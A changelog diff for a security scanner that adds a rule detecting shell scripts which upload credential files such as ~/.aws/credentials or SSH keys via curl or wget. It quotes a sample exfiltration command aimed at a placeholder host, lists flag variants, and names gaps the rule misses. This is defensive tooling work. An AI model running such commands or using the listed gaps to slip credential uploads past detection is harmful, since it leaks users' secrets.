@@ -4,6 +4,30 @@ All notable changes to HackMyAgent are documented in this file.
 
 ## [Unreleased]
 
+### `secure` detects credential-file exfiltration in shell scripts (SHELL-EXFIL-001)
+
+A shell script whose only content was `curl -X POST https://host -d @~/.aws/credentials`
+scored 98/100 with no finding: `secure` scanned `.sh` for the download-execute shape
+(INSTALL-001, `curl … | sh`) but had no rule for the reverse — a remote `curl`/`wget` that
+uploads a known credential file. The new check `SHELL-EXFIL-001` fires CRITICAL when a
+`.sh`/`.bash`/`.zsh` command reads a credential file (`~/.aws/credentials`, `~/.ssh/id_*`,
+`.env`, gcloud/docker/kube/npm/netrc/git credentials) into the body of a `curl`/`wget`
+request that names a literal remote URL. The credential path is caught whether the flag and
+its value are space-separated, `=`-joined, or glued together — `-d @f`, `-d@f`, `--data=@f`,
+`-Ffield=@f`, `--data-urlencode name@f`, `-T~/path` all match. The finding reports the
+credential path, the destination, and a fix; if a destination is known-good, add its path to
+`.hmaignore`.
+
+Scoped to the credential-file upload shape so it does not fire on benign `curl … | sh`
+installers (INSTALL-001's surface), on local copies (`aws s3 sync`, `rsync`, `tar`), or on a
+plain `@payload.json` POST. SSH public keys and `.env.example`-style templates (including
+`.env.example.bak`) are excluded. Known limits, not closed here: only `curl`/`wget` are read —
+`scp`/`sftp`/`nc` and language one-liners are out of scope; only the credential files listed
+above are recognised (`.pgpass`, `.gnupg/*`, `~/.aws/config` are not); an env-var destination
+(`curl "$URL" -d @~/.aws/credentials`), a `--data "$(cat ~/.aws/credentials)"` body, and
+extensionless shell scripts identified only by shebang are out of scope (v2 scope tracked in
+#587). Check count moves 323 → 324 (311 static).
+
 ### Security
 
 #### `fix-all` no longer writes private keys into the tree it fixes
